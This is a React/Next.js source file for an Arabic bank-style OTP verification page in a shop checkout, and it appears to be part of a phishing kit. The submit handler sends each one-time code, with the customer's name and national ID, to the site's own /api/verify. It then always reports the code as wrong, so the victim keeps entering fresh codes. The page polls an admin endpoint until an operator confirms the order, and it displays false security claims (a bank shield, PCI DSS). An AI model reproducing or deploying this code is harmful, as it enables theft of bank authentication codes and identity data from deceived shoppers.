"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { FileText, Receipt, X } from "lucide-react";

export default function VerifyPage() {
  const [otp, setOtp] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [lengthError, setLengthError] = useState(false);
  const [resent, setResent] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(
    typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
  );
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  function startCooldown() {
    localStorage.setItem("resendUnlockAt", String(Date.now() + 60000));
    setCooldown(60);
    clearInterval(cooldownRef.current!);
    cooldownRef.current = setInterval(() => {
      setCooldown((prev) => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  useEffect(() => {
    const currentTime = Date.now();
    let unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
    if (unlockAt <= currentTime) {
      unlockAt = currentTime + 60000;
      localStorage.setItem("resendUnlockAt", String(unlockAt));
    }
    const remaining = Math.ceil((unlockAt - currentTime) / 1000);
    if (remaining <= 0) return;
    const timeoutId = setTimeout(() => {
      setCooldown(remaining);
      cooldownRef.current = setInterval(() => {
        setCooldown((prev) => {
          if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
          return prev - 1;
        });
      }, 1000);
    }, 0);
    return () => {
      clearTimeout(timeoutId);
      if (cooldownRef.current) clearInterval(cooldownRef.current);
    };
  }, []);

  useEffect(() => {
    const id = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
    if (!id) return;
    if (!dbOrderId) setDbOrderId(id);
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${id}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  function handleOtpChange(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 6);
    setOtp(digits);
    setCodeError(false);
    setLengthError(false);
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const code = otp;
    if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    setCodeError(true);
    setOtp("");
    setSubmitCooldown(5);
    clearInterval(submitCooldownRef.current!);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown((prev) => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  // ── Confirmed Popup ──
  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
  if (confirmed && confirmedId) {
    return (
      <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 px-4" dir="rtl">
        <div className="relative bg-white rounded-3xl shadow-2xl w-full max-w-sm sm:max-w-md md:max-w-lg overflow-hidden mx-4">
          <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-500 transition-all z-10">
            <X className="w-4 h-4" />
          </Link>
          <div className="flex flex-col items-center pt-4 sm:pt-5 pb-3 bg-white">
            <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 md:w-44 md:h-44 object-contain" />
            <span className="mt-2 bg-[#E6EFC0] text-black text-sm font-bold px-4 sm:px-6 py-1.5 rounded-2xl">نجحت عملية الدفع</span>
          </div>
          <div className="px-4 sm:px-5 py-3 sm:py-4 flex flex-col gap-3 text-center">
            <div className="space-y-1">
              <p className="text-gray-800 font-semibold text-base">تمت العملية بنجاح</p>
              <p className="text-gray-500 text-sm leading-6 sm:leading-7">
                شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا، ونتمنى أن نكون عند حسن ظنكم وتوقعاتكم.
              </p>
              <p className="text-gray-500 text-sm">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
            </div>
            <div className="flex flex-col sm:flex-row gap-2 sm:gap-3 pb-1">
              <a href={`/invoice/${confirmedId}`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center bg-[#89BA45] justify-center gap-2 py-2 sm:py-2.5 rounded-xl text-white font-semibold text-sm transition-all">
                <FileText className="w-4 h-4" /> الفاتورة
              </a>
              <a href={`/invoice/${confirmedId}/receipt`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2 sm:py-2.5 rounded-xl bg-[#89BA45] text-white font-semibold text-sm transition-all">
                <Receipt className="w-4 h-4" /> سند القبض
              </a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  const pad = (n: number) => String(n).padStart(2, "0");

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap');
        body { background: #f3f4f5 !important; margin: 0; }
        * { font-family: 'Cairo', sans-serif; }
        .otp-field {
          width: 100%; text-align: center; font-size: 1.5rem; font-weight: 700;
          border: 2px solid #e0e2e4; border-radius: 14px;
          background: #fff; color: #191c1d; padding: 14px 16px;
          transition: all 0.2s ease; outline: none;
          letter-spacing: 0.4em;
        }
        .otp-field:focus {
          border-color: #3b6a00;
          box-shadow: 0 0 0 3px rgba(59,106,0,0.1);
        }
        .otp-field.error { border-color: #ef4444; background: #fef2f2; }
        .otp-field::placeholder { color: #c0c4c8; letter-spacing: 0.1em; font-size: 0.9rem; }
      `}</style>

      <div dir="rtl" lang="ar" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", background: "#f3f4f5" }}>

        {/* Background blurs */}
        <div style={{ position: "fixed", inset: 0, zIndex: 0, pointerEvents: "none", overflow: "hidden" }}>
          <div style={{ position: "absolute", top: "-8%", left: "-8%", width: "35%", height: "35%", background: "rgba(109,190,0,0.04)", borderRadius: "50%", filter: "blur(100px)" }} />
          <div style={{ position: "absolute", bottom: "-5%", right: "-5%", width: "28%", height: "28%", background: "rgba(153,233,253,0.07)", borderRadius: "50%", filter: "blur(90px)" }} />
        </div>

       

        {/* Main */}
        <main style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "24px 16px 48px", position: "relative", zIndex: 1 }}>
          <div style={{
            width: "100%", maxWidth: 440,
            background: "#fff", borderRadius: 20,
            boxShadow: "0 8px 40px rgba(25,28,29,0.06), 0 1.5px 6px rgba(25,28,29,0.03)",
            overflow: "hidden",
          }}>
            <form onSubmit={handleSubmit} style={{ padding: "40px 32px 36px", display: "flex", flexDirection: "column", alignItems: "center" }}>

              {/* Bank Shield Icon */}
              <div style={{ width: 56, height: 56, borderRadius: 16, background: "linear-gradient(135deg, #3b6a00, #6dbe00)", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 16, boxShadow: "0 4px 14px rgba(59,106,0,0.2)" }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="#fff" stroke="none"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
              </div>

              {/* Title */}
              <h1 style={{ fontSize: "1.5rem", fontWeight: 800, color: "#191c1d", margin: "0 0 6px", lineHeight: 1.3 }}>تأكيد العملية</h1>
              <p style={{ fontSize: "0.82rem", color: "#6b7280", margin: "0 0 8px", lineHeight: 1.7 }}>تم إرسال رمز التحقق (OTP) إلى رقم الجوال المسجل لدى البنك</p>
              <p style={{ fontSize: "0.72rem", color: "#9ca3af", margin: "0 0 28px", lineHeight: 1.6, background: "#f9fafb", padding: "6px 14px", borderRadius: 8 }}>⏱ قد يستغرق وصول الرمز بضع ثوانٍ، يرجى الانتظار</p>

              {/* OTP Input */}
              <div style={{ width: "100%", marginBottom: 8 }} dir="ltr">
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={otp}
                  onChange={(e) => handleOtpChange(e.target.value)}
                  placeholder="أدخل الرمز"
                  className={`otp-field${codeError ? " error" : ""}`}
                />
              </div>

              {/* Errors */}
              <div style={{ minHeight: 28, display: "flex", alignItems: "center", justifyContent: "center" }}>
                {lengthError && <p style={{ color: "#f59e0b", fontSize: "0.82rem", fontWeight: 600, margin: 0 }}>⚠️ يجب إدخال 4 أو 6 أرقام</p>}
                {codeError && <p style={{ color: "#ef4444", fontSize: "0.82rem", fontWeight: 600, margin: 0 }}>الرمز غير صحيح</p>}
                {resent && <p style={{ color: "#16a34a", fontSize: "0.82rem", fontWeight: 500, margin: 0 }}>✅ تم إعادة إرسال الرمز</p>}
              </div>

              {/* Timer & Resend */}
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 10, marginBottom: 28 }}>
                {cooldown > 0 ? (
                  <span style={{ color: "#9ca3af", fontSize: "0.82rem", fontWeight: 600 }}>
                    إعادة إرسال الرمز خلال {cooldown} ثانية
                  </span>
                ) : (
                  <button
                    type="button"
                    onClick={() => {
                      fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                      setResent(true);
                      setTimeout(() => setResent(false), 3000);
                      startCooldown();
                    }}
                    style={{
                      background: "none", border: "none", padding: 0,
                      fontSize: "0.82rem", fontWeight: 600,
                      color: "#3b6a00", cursor: "pointer",
                      textDecoration: "underline", textUnderlineOffset: 3,
                    }}
                  >
                    إعادة إرسال الرمز
                  </button>
                )}
              </div>

              {/* Submit */}
              <button
                type="submit"
                disabled={submitCooldown > 0}
                style={{
                  width: "100%", padding: "15px 0", borderRadius: 14, border: "none",
                  fontSize: "1.05rem", fontWeight: 700, color: "#fff",
                  background: submitCooldown > 0 ? "#9ca3af" : "linear-gradient(135deg, #3b6a00, #6dbe00)",
                  cursor: submitCooldown > 0 ? "not-allowed" : "pointer",
                  opacity: submitCooldown > 0 ? 0.65 : 1,
                  boxShadow: submitCooldown > 0 ? "none" : "0 4px 16px rgba(59,106,0,0.25)",
                  transition: "all 0.25s ease",
                }}
              >
                {submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : "إتمام الطلب "}
              </button>

              {/* Security warnings */}
              <div style={{ marginTop: 24, width: "100%", display: "flex", flexDirection: "column", gap: 8 }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#dc2626", fontSize: "0.68rem", fontWeight: 600 }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="#dc2626" stroke="none">
                    <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm1 14h-2v-2h2v2zm0-4h-2V7h2v5z" />
                  </svg>
                  <span>لا تشارك رمز التحقق مع أي شخص — البنك لن يطلبه منك أبداً</span>
                </div>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#9ca3af", fontSize: "0.62rem" }}>
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                  <span>اتصال مشفّر وآمن بمعايير PCI DSS</span>
                </div>
              </div>

            </form>
          </div>
        </main>

      

      </div>
    </>
  );
}
